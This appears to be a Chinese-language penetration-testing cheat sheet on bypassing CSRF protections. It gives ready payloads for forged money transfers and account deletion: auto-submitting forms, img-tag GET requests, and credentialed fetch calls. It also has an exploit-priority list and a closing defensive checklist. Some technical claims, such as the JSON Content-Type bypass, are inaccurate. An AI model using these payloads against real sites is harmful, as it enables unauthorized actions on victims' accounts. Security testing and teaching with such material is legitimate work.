# CSRF绕过秘笈

## 令牌验证绕过

### 令牌缺失验证
```html
<!-- 原始安全表单 -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="abc123def456">
    <input type="hidden" name="amount" value="100">
    <input type="submit">
</form>

<!-- 攻击：直接去掉token -->
<form method="POST" action="/transfer">
    <input type="hidden" name="amount" value="100">
    <input type="submit">
</form>

<!-- 如果后端仅检查token是否存在，不检查有效性 -->
```

### 令牌验证不严格
```html
<!-- 错误的验证逻辑 -->
if ($_POST['csrf_token']) {  // 仅检查是否存在，非空
    processTransaction();
}

<!-- 攻击：任意token值 -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="anything">
    <input type="hidden" name="amount" value="100">
</form>
```

### 预测或枚举令牌
```
Token格式：user_id + timestamp + hash
Token: 123_1609459200_abc123

攻击：
1. 计算可能的tokens
2. 枚举或预测hash值
3. 重放有效token

某些应用使用弱hash(md5/sha1)，可被预测或碰撞
```

## Content-Type绕过

### 改变Content-Type
```html
<!-- 标准CSRF -->
<form method="POST" action="/transfer">
    <!-- form默认: application/x-www-form-urlencoded -->
</form>

<!-- 如果服务器仅检查非form Content-Type -->
XMLHttpRequest不受同源策略限制（某些CORS配置下）
fetch('/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({amount: 100})
})
```

### 简化的Content-Type
```
原始：Content-Type: application/json
攻击：Content-Type: text/plain
# 某些框架处理不同
```

## SameSite Cookie绕过

### SameSite=Lax绕过
```
SameSite=Lax 允许导航请求（顶级导航）

攻击场景：
1. 用户访问恶意网站
2. 恶意网站创建 <a href="https://bank.com/transfer?amount=1000">
3. 用户点击链接 - GET请求发送Lax Cookie
4. 服务器因为是导航请求而接受该操作
```

### SameSite=None不安全
```
Set-Cookie: session=abc123; SameSite=None; Secure
# 允许跨站请求发送Cookie，直接CSRF
```

### Cookie未设置SameSite
```
旧应用未指定SameSite属性：
Set-Cookie: session=abc123;
# 默认行为因浏览器而异，某些旧浏览器允许跨站发送
```

## HTTP方法绕过

### GET请求CSRF
```html
<!-- 原始仅POST受保护 -->
POST /transfer 需要CSRF token

<!-- 某些应用也支持GET -->
GET /transfer?amount=100&target=hacker
# 无需form，仅需IMG或LINK

<img src="https://bank.com/transfer?amount=1000&target=attacker">
```

### HEAD和OPTIONS
```
如果仅POST被保护，但DELETE/PUT等未受保护

DELETE /transfer (允许)
PUT /transfer (允许)
```

## 隐藏表单和自动提交

### 预填充表单自动提交
```html
<form id="csrf_form" method="POST" action="https://target.com/action">
    <input type="hidden" name="action" value="delete_account">
    <input type="hidden" name="password" value=""> <!-- 用户看不到 -->
    <script>
        // 加载页面时自动提交
        document.getElementById('csrf_form').submit();
    </script>
</form>
```

### 邮件中的图片CSRF
```html
<!-- 用户打开邮件时，自动发起请求 -->
<img src="https://email.service.com/delete?folder_id=inbox" width="1" height="1">
```

## 跨域和CORS绕过

### 简单请求CSRF
```javascript
// CORS预检不会被触发的请求（简单请求）
fetch('https://api.bank.com/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'amount=1000&target=attacker',
    credentials: 'include'
})
// 如果CORS允许，Cookie会被发送
```

### 错误的Origin检查
```php
// 检查Origin头
if ($_SERVER['HTTP_ORIGIN'] != 'https://bank.com') {
    // 拒绝
}

// 绕过方式：
// 1. 某些浏览器不发送Origin头，仅Referer
// 2. Referer可被修改（某些情况）
// 3. Origin检查忽略大小写或子域
```

## Flash和旧技术CSRF

### Flash跨域请求
```
某些旧应用可能信任Flash请求，而其他保护不适用
```

### Java Applet
```
类似Flash，可发起跨域请求
```

## 快速定位和利用

**关键词识别**：
- 无CSRF token验证
- Token验证不严格（仅检查存在性）
- 支持GET请求进行状态改变操作
- Content-Type验证不完整
- Cookie仅用HttpOnly但无SameSite
- 无Origin/Referer检查

**测试优先级**：
1. 移除CSRF token（最简单）
2. 改变Content-Type（JSON替代form）
3. 改用GET请求（如果支持）
4. SameSite=Lax绕过（顶级导航）
5. 预测或枚举token（如果格式可预测）

## 防御检查清单

- ✓ 实施CSRF token，每个表单一个
- ✓ token绑定到会话和用户
- ✓ 验证token的真实性，不仅检查存在性
- ✓ 设置 SameSite=Strict Cookie属性
- ✓ 验证Origin和Referer头
- ✓ 状态改变操作仅允许POST（或其他非幂等方法）
- ✓ 关键操作要求额外验证（密码、2FA）
- ✓ 定期轮换token
